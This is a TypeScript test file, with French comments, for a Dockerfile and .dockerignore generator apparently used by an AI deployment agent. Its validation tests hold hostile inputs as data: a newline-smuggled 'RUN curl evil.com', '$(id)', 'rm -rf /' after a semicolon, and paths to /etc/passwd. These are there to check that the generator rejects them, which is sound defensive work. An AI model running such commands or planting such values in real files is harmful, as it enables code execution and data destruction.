import { describe, expect, it } from "vitest"

import { generateDockerfile, generateDockerignore, pickTemplate } from "./dockerfile.js"

const nextStandalone = {
  famille: "node", sortie: "standalone", version: "22",
  gestionnaire: "pnpm", port: 3000, repertoire: null,
} as const

describe("generateDockerfile", () => {
  it("produit un Dockerfile Next.js en sortie standalone", () => {
    const df = generateDockerfile(nextStandalone)

    expect(df).toContain("FROM node:22-alpine")
    expect(df).toContain("pnpm")
    expect(df).toContain("EXPOSE 3000")
    expect(df).toContain(".next/standalone")
  })

  /**
   * Trois propriétés que le gabarit doit garantir sans que l'IA ait à y penser — ce sont
   * précisément celles qu'un Dockerfile écrit à la volée oublie.
   */
  it.each([
    ["node", "standalone"], ["node", "server"], ["node", "static"],
    ["python", "server"], ["static", "static"],
  ] as const)("construit en plusieurs étapes et sans root : %s/%s", (famille, sortie) => {
    const df = generateDockerfile({
      famille, sortie, version: famille === "python" ? "3.12" : "22",
      gestionnaire: famille === "node" ? "pnpm" : null,
      port: 3000, repertoire: sortie === "static" ? "dist" : null,
    })

    // Plusieurs étapes : les outils de construction ne partent pas en production.
    expect((df.match(/^FROM /gm) ?? []).length).toBeGreaterThanOrEqual(2)
    // Non-root : une faille applicative ne donne pas la machine.
    expect(df).toMatch(/^USER (?!root)/m)
    // Pas de secret en dur, jamais.
    expect(df).not.toMatch(/ENV\s+\w*(SECRET|TOKEN|PASSWORD|KEY)\w*=/i)
  })

  it("respecte le gestionnaire de paquets détecté", () => {
    for (const [gestionnaire, attendu] of [
      ["pnpm", "pnpm install"], ["npm", "npm ci"], ["yarn", "yarn install"], ["bun", "bun install"],
    ] as const) {
      const df = generateDockerfile({ ...nextStandalone, gestionnaire })
      expect(df).toContain(attendu)
    }
  })

  /**
   * `npm ci` exige un package-lock.json. Sans gestionnaire détecté, le gabarit doit se
   * rabattre sur une commande qui marche sans fichier de verrouillage, sinon la
   * construction échoue sur un dépôt parfaitement valide.
   */
  it("se rabat sur une commande qui marche sans fichier de verrouillage", () => {
    const df = generateDockerfile({ ...nextStandalone, gestionnaire: null })

    expect(df).toContain("npm install")
    expect(df).not.toContain("npm ci")
  })

  it("copie le répertoire de sortie pour un site statique", () => {
    const df = generateDockerfile({
      famille: "node", sortie: "static", version: "22",
      gestionnaire: "pnpm", port: 80, repertoire: "dist",
    })

    expect(df).toContain("dist")
    expect(df).toMatch(/FROM (nginx|caddy|busybox)/)
  })

  it("produit un Dockerfile Python ASGI", () => {
    const df = generateDockerfile({
      famille: "python", sortie: "server", version: "3.12",
      gestionnaire: null, port: 8000, repertoire: null,
    })

    expect(df).toContain("FROM python:3.12")
    expect(df).toContain("requirements.txt")
    expect(df).toContain("EXPOSE 8000")
  })

  /**
   * Le paramètre vient d'une déduction sur le dépôt du client, donc indirectement d'un
   * texte que l'agent a lu. Une version fantaisiste doit être refusée ici, pas produire
   * un `FROM node:$(curl evil.com)-alpine`.
   */
  it("refuse une version qui n'en est pas une", () => {
    for (const mauvais of ["22-alpine\nRUN curl evil.com", "$(id)", "../..", "22 ; rm -rf /", ""]) {
      expect(() => generateDockerfile({ ...nextStandalone, version: mauvais })).toThrow(/version/i)
    }
  })

  it("refuse un répertoire de sortie qui échappe à la racine", () => {
    for (const mauvais of ["../etc", "/etc/passwd", "dist; rm -rf /", "di\nst"]) {
      expect(() =>
        generateDockerfile({ famille: "node", sortie: "static", version: "22",
                             gestionnaire: "pnpm", port: 80, repertoire: mauvais })
      ).toThrow(/répertoire/i)
    }
  })

  it("refuse un port hors bornes", () => {
    for (const mauvais of [0, -1, 70000, 1.5, Number.NaN]) {
      expect(() => generateDockerfile({ ...nextStandalone, port: mauvais })).toThrow(/port/i)
    }
  })

  /** Déterminisme : le jalon 3b s'appuie dessus pour reconnaître un redéploiement. */
  it("produit exactement le même texte pour les mêmes paramètres", () => {
    expect(generateDockerfile(nextStandalone)).toBe(generateDockerfile(nextStandalone))
  })
})

describe("generateDockerignore", () => {
  it("exclut ce qui ne doit jamais entrer dans une image", () => {
    const ignore = generateDockerignore()

    for (const attendu of ["node_modules", ".git", ".env", "Dockerfile", ".next", "dist"]) {
      expect(ignore.split("\n")).toContain(attendu)
    }
  })

  /**
   * Le `.env` est la ligne la plus importante du fichier : sans elle, les secrets du
   * client partent dans une couche d'image, lisible par quiconque obtient l'image.
   */
  it("exclut toutes les formes de fichier d'environnement", () => {
    const lignes = generateDockerignore().split("\n")

    expect(lignes).toContain(".env")
    expect(lignes.some((l) => l.startsWith(".env."))).toBe(true)
  })
})

describe("pickTemplate", () => {
  it.each([
    ["node", "standalone", "standalone"],
    ["node", "server", "server"],
    ["node", "static", "static"],
    ["python", "server", "server"],
    ["static", "static", "static"],
  ] as const)("choisit un gabarit pour %s/%s", (famille, sortie, attendu) => {
    expect(pickTemplate(famille, sortie)).toBe(attendu)
  })

  /**
   * Le refus est un résultat, pas un échec (spec §5.4) : quand aucun gabarit ne convient,
   * le composeur demandera un Dockerfile plutôt que d'improviser.
   */
  it.each([
    ["php", "server"], ["go", "server"], ["inconnu", "inconnu"], ["node", "inconnu"],
    ["python", "static"],
  ] as const)("rend null sans improviser pour %s/%s", (famille, sortie) => {
    expect(pickTemplate(famille, sortie)).toBeNull()
  })
})
